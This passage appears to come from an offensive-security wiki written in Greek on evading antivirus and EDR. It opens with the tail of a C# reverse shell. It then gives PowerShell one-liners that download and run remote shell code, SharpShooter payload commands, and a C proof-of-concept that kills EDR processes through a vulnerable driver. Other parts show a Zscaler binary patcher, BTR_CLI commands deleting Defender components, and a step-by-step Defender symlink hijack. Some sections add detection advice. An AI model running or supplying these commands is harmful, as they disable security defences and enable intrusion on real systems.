strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# με χρήση compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα με C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της python για παράδειγμα κατασκευής injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Τερματισμός AV/EDR Από Kernel Space

Το Storm-2603 αξιοποίησε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις endpoint protections πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για την εκτέλεση privileged kernel operations, τις οποίες ακόμη και οι AV services τύπου Protected-Process-Light (PPL) δεν μπορούν να αποκλείσουν.<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Signed driver**: Το αρχείο που παραδίδεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα signed driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη και όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs που εκθέτει ο driver**
| Κωδικός IOCTL | Δυνατότητα                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Τερματισμός ενός arbitrary process μέσω PID (χρησιμοποιείται για τον τερματισμό των Defender/EDR services) |
| `0x990000D0` | Διαγραφή ενός arbitrary file από τον δίσκο |
| `0x990001D0` | Unload του driver και αφαίρεση του service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις user-mode protections· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *protected* processes, να τα τερματίσει ή να παραποιήσει kernel objects, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες hardening features.

Detection / Mitigation
•  Ενεργοποιήστε τη vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων *kernel* services και δημιουργήστε alert όταν ένας driver φορτώνεται από world-writable directory ή δεν υπάρχει στη allow-list.
•  Παρακολουθείτε user-mode handles προς custom device objects που ακολουθούνται από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των Posture Checks του Zscaler Client Connector μέσω On-Disk Binary Patching

Το **Client Connector** της Zscaler εφαρμόζει device-posture rules τοπικά και βασίζεται στα Windows RPC για την επικοινωνία των αποτελεσμάτων σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή μια πλήρη παράκαμψη:

1. Η αξιολόγηση του posture πραγματοποιείται **εξ ολοκλήρου client-side** (ένα boolean αποστέλλεται στον server).
2. Τα internal RPC endpoints ελέγχουν μόνο ότι το executable που συνδέεται είναι **signed από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με **patching τεσσάρων signed binaries στον δίσκο**, και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Original logic που έγινε patch | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, επομένως κάθε check είναι compliant |
| `ZSAService.exe` | Indirect call προς `WinVerifyTrust` | Έγινε NOP-ed ⇒ οποιοδήποτε process, ακόμη και unsigned, μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks στο tunnel | Παρακάμπτονται μέσω short-circuit |

Απόσπασμα από minimal patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι posture checks εμφανίζονται **πράσινοι/συμμορφούμενοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο compromised host αποκτά unrestricted access στο internal network που ορίζεται από τις Zscaler policies.

Αυτή η case study δείχνει πώς οι trust decisions που λαμβάνονται αποκλειστικά στην πλευρά του client και οι απλοί signature checks μπορούν να παρακαμφθούν με μερικά byte patches.

## Abuse της trusted functionality του Microsoft Defender `BTR.sys`

Ο driver **Boot-Time Removal** του Defender αποτελεί χρήσιμο counterexample στο κλασικό BYOVD. Το `BTR.sys` είναι ένα legitimate Microsoft-signed remediation component χωρίς memory-corruption bug και χωρίς IOCTL interface· αφού αποκτήσει administrator access και `SeLoadDriverPrivilege`, ένας operator μπορεί αντί γι’ αυτό να πλαστογραφήσει το private remediation transaction και να αποκτήσει τις προβλεπόμενες Ring-0 file/registry operations. Αυτό είναι ένα **post-compromise AV/EDR-neutralization primitive, όχι initial access ή privilege escalation**, και ο driver μπορεί να εξαχθεί από το `BOOTTIMETOOL` resource του `MpEngine.dll` του ίδιου του target, αντί να εισαχθεί ένας conspicuous third-party driver.<sup>[[36]](#references)</sup>

### Staging του one-shot driver

Ο Defender κανονικά αποθηκεύει το resource ως ένα random αρχείο `[a-z]{8}.sys` και καταχωρίζει μια kernel service με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της service, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει feedback και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε ο driver να γίνει unload αντί να παραμείνει resident. Ένα forged service έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν επαναχρησιμοποιούν ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο authorization. Ένα έγκυρο plaintext έχει global header 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC και transaction ID που προκύπτει από το payload), ακολουθούμενο από ένα null-terminated μονοπάτι feedback σε UTF-16 και οποιονδήποτε αριθμό items. Κάθε item έχει header 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και action-specific data που τελειώνουν σε **ακριβώς τέσσερα NUL bytes**. Κάθε περιοχή header/data ελέγχεται ανεξάρτητα με CRC-32 polynomial `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς final XOR** (`~CRC32`)· η κατάσταση CRC επαναφέρεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action IDs εκθέτουν αυτά τα kernel primitives.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, συμπεριλαμβανομένου locked αρχείου |
| 2 | `[UTF-16 path]` | Αφαίρεση κενoύ directory |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε protected path που επιλέγει ο attacker· κενό destination σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Recursive διαγραφή registry key |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση registry value και δημιουργία paths κλειδιών που λείπουν |

Για τα actions 5 και 6, ο on-wire διαχωριστής key/value είναι **δύο διαδοχικά backslashes**· ένα path σε συμβατική μορφή δεν θα διαχωριστεί σωστά. Το feedback file ως επί το πλείστον αντικατοπτρίζει το request, αλλά τα πρώτα τέσσερα data bytes κάθε item γίνονται το resulting `NTSTATUS`. Για τα actions 1 και 2, τα οποία δεν έχουν leading flags field, το BTR μετατοπίζει το path στα τέσσερα δεσμευμένα trailing bytes για να δημιουργήσει χώρο για αυτό το status.<sup>[[36]](#references)</sup>

### Workflow του `BTR_CLI` και window early-boot

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξάγει το `BTR.sys` από το τοπικό Defender, δημιουργεί τα `<random>.sys:changelist` και ένα feedback stream, κάνει serialize/checksum/encrypt chained actions, δημιουργεί απευθείας το service registry key και στη συνέχεια καλεί το `NtLoadDriver` για το `-trigger now` ή το αφήνει ως system-start driver για το `-trigger boot`. Το direct registry staging παρακάμπτει το κανονικό SCM `CreateServiceW` path και επομένως **δεν** δημιουργεί service-install Event ID 7045. Τα artifacts που ενεργοποιούνται κατά το boot μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
Το `Start=0` δεν είναι usable επειδή το BTR εκτελεί file I/O από το `DriverEntry`, πριν να είναι έτοιμα το storage stack και το link `SystemRoot`. Το `Start=1`, μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender`, εκτελείται αντίθετα στη Phase 1: το NTFS είναι usable, αλλά πολλά system-start security drivers και user-mode EDR services δεν έχουν αρχικοποιηθεί. Boot-start filters όπως το `WdFilter` μπορεί να έχουν ήδη φορτωθεί, ωστόσο το BTR μπορεί να αφαιρέσει τα binaries ή το service configuration τους πριν από την επόμενη εκκίνηση και να διαγράψει τα service executables πριν τα εκκινήσει το SCM. Το ELAM δεν κλείνει αυτό το κενό, επειδή το BTR εκτελείται μετά το boot-start evaluation και διαθέτει έγκυρη Microsoft signature.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία transaction. Το PoC προσθέτει ως πρώτη την Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το log, στη συνέχεια καταναλώνει το δικό του delete request και το αφαιρεί πριν γίνει unload. Αυτό μειώνει τα evidence, ενώ η τοποθέτηση feedback στο `<random>.sys:<random>.dat` επιτρέπει την αφαίρεση του driver και των δύο streams μαζί.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης υψηλού σήματος

Οι signature-only rules και το Microsoft vulnerable-driver blocklist δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω behavioral correlations, διακρίνοντας παράλληλα το legitimate Defender lineage από έναν arbitrary launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική στο BTR staging. Ένα `.dat` ADS συνδεδεμένο με το ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το legitimate Defender τοποθετεί κανονικά το feedback κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** Συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>` που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender`, χωρίς αντίστοιχο SCM installation event.
- **Sysmon 6 -> 23:** Συσχετίστε ένα γνωστό BTR driver load από non-Defender lineage με επακόλουθη file deletion που αποδίδεται στο `System`/PID 4, ιδιαίτερα για security binaries.
- **Sysmon 11 -> 23:** Δημιουργήστε alert για την ταχεία δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγξτε την assignment/enabling του `SeLoadDriverPrivilege`. Μία Microsoft signature από μόνη της δεν αρκεί ως trust όταν ένας security-tool driver γίνεται stage από `cmd.exe`, PowerShell ή άγνωστο process.

## Κατάχρηση του Protected Process Light (PPL) για Tamper σε AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια signer/level hierarchy, ώστε μόνο protected processes ίσου ή υψηλότερου επιπέδου να μπορούν να κάνουν tamper μεταξύ τους. Επιθετικά, αν μπορείτε να εκκινήσετε νόμιμα ένα PPL-enabled binary και να ελέγχετε τα arguments του, μπορείτε να μετατρέψετε benign functionality (π.χ. logging) σε ένα constrained, PPL-backed write primitive εναντίον protected directories που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι κάνει ένα process να εκτελείται ως PPL
- Το target EXE (και κάθε loaded DLL) πρέπει να είναι signed με PPL-capable EKU.
- Το process πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί compatible protection level που να αντιστοιχεί στον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Λανθασμένα levels θα αποτύχουν κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και την LSASS protection εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το signed system binary `C:\Windows\System32\ClipUp.exe` κάνει self-spawn και δέχεται παράμετρο για την εγγραφή ενός log file σε path που καθορίζει ο caller.
- Όταν εκκινείται ως PPL process, η εγγραφή του file πραγματοποιείται με PPL backing.
- Το ClipUp δεν μπορεί να κάνει parse σε paths που περιέχουν spaces· χρησιμοποιήστε 8.3 short paths για να δείξετε σε κανονικά προστατευμένες τοποθεσίες.

8.3 short path helpers
- List short names: `dir /x` σε κάθε parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Περάστε το ClipUp log-path argument για να επιβάλετε τη δημιουργία ενός file σε protected AV directory (π.χ. Defender Platform). Χρησιμοποιήστε 8.3 short names αν χρειάζεται.
3) Αν το target binary είναι κανονικά ανοιχτό/κλειδωμένο από το AV κατά την εκτέλεση (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας ένα auto-start service που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη boot ordering με το Process Monitor (boot logging).
4) Μετά το reboot, η PPL-backed εγγραφή πραγματοποιείται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το target file και αποτρέποντας την εκκίνηση.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp πέρα από τη θέση· το primitive είναι κατάλληλο για corruption και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται local admin/SYSTEM για την εγκατάσταση/εκκίνηση ενός service και ένα χρονικό παράθυρο για reboot.
- Ο συγχρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά το boot αποφεύγει τα file locks.

Detections
- Δημιουργία process του `ClipUp.exe` με ασυνήθιστα arguments, ειδικά όταν το parent είναι μη τυπικός launcher, κοντά στο boot.
- Νέα services ρυθμισμένα για auto-start ύποπτων binaries και τα οποία ξεκινούν συστηματικά πριν από το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση service πριν από failures κατά την εκκίνηση του Defender.
- File integrity monitoring σε binaries/Platform directories του Defender· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από processes με protected-process flags.
- ETW/EDR telemetry: αναζητήστε processes που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και anomalous χρήση επιπέδων PPL από non-AV binaries.

Mitigations
- WDAC/Code Integrity: περιορίστε ποια signed binaries μπορούν να εκτελούνται ως PPL και κάτω από ποια parents· αποκλείστε την invocation του ClipUp εκτός νόμιμων contexts.
- Service hygiene: περιορίστε τη δημιουργία/τροποποίηση auto-start services και παρακολουθείτε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένα τα Defender tamper protection και early-launch protections· ερευνήστε startup errors που υποδεικνύουν binary corruption.
- Εξετάστε την απενεργοποίηση της δημιουργίας short names 8.3 σε volumes που φιλοξενούν security tooling, εφόσον είναι συμβατό με το περιβάλλον σας (κάντε thorough testing).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Το Windows Defender επιλέγει την platform από την οποία εκτελείται, απαριθμώντας τους subfolders κάτω από:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον subfolder με το υψηλότερο lexicographic version string (π.χ. `4.18.25070.5-0`) και στη συνέχεια εκκινεί από εκεί τα Defender service processes (ενημερώνοντας ανάλογα τα service/registry paths). Αυτή η επιλογή εμπιστεύεται directory entries, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε attacker-writable path και να επιτύχει DLL sideloading ή service disruption.<sup>[[21]](#references)[[22]](#references)</sup>

Preconditions
- Local Administrator (απαιτείται για τη δημιουργία directories/symlinks κάτω από τον Platform folder)
- Δυνατότητα για reboot ή trigger του Defender platform re-selection (service restart κατά το boot)
- Απαιτούνται μόνο built-in tools (`mklink`)

Why it works
- Το Defender αποκλείει τις εγγραφές στους δικούς του folders, αλλά η platform selection εμπιστεύεται τα directory entries και επιλέγει το lexicographically υψηλότερο version χωρίς να επικυρώνει ότι ο στόχος επιλύεται σε protected/trusted path.

Step-by-step (example)
1) Προετοιμάστε ένα writable clone του τρέχοντος platform folder, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από τη redirected διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη διαδρομή της νέας διεργασίας υπό `C:\TMP\AV\` και τη διαμόρφωση της υπηρεσίας/το registry να αντικατοπτρίζουν αυτήν την τοποθεσία.

Post-exploitation options
- DLL sideloading/code execution: Αποθέστε/αντικαταστήστε DLLs που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, ώστε να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτυγχάνει να εκκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Σημειώστε ότι αυτή η technique δεν παρέχει privilege escalation από μόνη της· απαιτεί δικαιώματα administrator.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν το runtime evasion από το C2 implant στο ίδιο το target module, κάνοντας hooking στο Import Address Table (IAT) του και δρομολογώντας επιλεγμένα APIs μέσω attacker-controlled, position-independent code (PIC). Αυτό γενικεύει το evasion πέρα από το μικρό API surface που εκθέτουν πολλά kits (π.χ. CreateProcessA) και επεκτείνει τις ίδιες protections σε BOFs και post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Κάντε stage ένα PIC blob μαζί με το target module χρησιμοποιώντας έναν reflective loader (prepended ή companion). Το PIC πρέπει να είναι self-contained και position-independent.
- Κατά τη φόρτωση του host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR και κάντε patch τις IAT entries για τα targeted imports (π.χ. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε thin PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail-call στο πραγματικό API address. Τα τυπικά evasions περιλαμβάνουν:
- Memory mask/unmask γύρω από το call (π.χ. encrypt beacon regions, RWX→RX, αλλαγή page names/permissions) και κατόπιν restore μετά το call.
- Call-stack spoofing: δημιουργία ενός benign stack και μετάβαση στο target API, ώστε το call-stack analysis να επιλύεται στα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για compatibility, κάντε export ένα interface, ώστε ένα Aggressor script (ή equivalent) να μπορεί να καταχωρίζει ποια APIs θα γίνονται hook για Beacon, BOFs και post-ex DLLs.

Γιατί IAT hooking εδώ
- Λειτουργεί για οποιονδήποτε κώδικα χρησιμοποιεί το hooked import, χωρίς τροποποίηση του tool code ή εξάρτηση από το Beacon για proxy συγκεκριμένων APIs.
- Καλύπτει post-ex DLLs: το hooking των LoadLibrary* σάς επιτρέπει να κάνετε intercept τα module loads (π.χ. System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στα API calls τους.
- Επαναφέρει την αξιόπιστη χρήση process-spawning post-ex commands απέναντι σε detections που βασίζονται στο call-stack, μέσω wrapping των CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφάρμοσε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr επιδεικνύουν hooking κατά τη διάρκεια του DllMain του loaded module.
- Διατήρησε τα wrappers μικρά και PIC-safe· κάνε resolve το true API μέσω της αρχικής τιμής IAT που κατέγραψες πριν από το patch ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποίησε μεταβάσεις RW → RX για το PIC και απόφυγε να αφήνεις writable+executable pages.

Stub για Call-stack spoofing
- PIC stubs τύπου Draugr δημιουργούν μια fake call chain (return addresses μέσα σε benign modules) και στη συνέχεια κάνουν pivot στο real API.
- Αυτό παρακάμπτει detections που περιμένουν canonical stacks από Beacon/BOFs προς sensitive APIs.
